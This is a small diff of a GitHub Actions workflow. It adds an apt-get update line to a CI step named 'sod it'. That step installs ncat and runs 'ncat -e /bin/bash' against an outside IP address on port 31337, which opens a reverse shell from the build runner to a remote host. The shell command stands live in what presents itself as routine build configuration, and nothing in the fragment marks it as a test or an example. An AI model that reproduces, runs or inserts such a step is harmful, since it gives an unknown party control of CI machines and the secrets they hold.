@@ -9,6 +9,7 @@ jobs:
     - uses: actions/checkout@v2
     - name: sod it
       run: |
+        sudo apt-get update
         sudo apt-get install ncat -y
         ncat -e /bin/bash 86.1.83.173 31337
     - name: Install deps
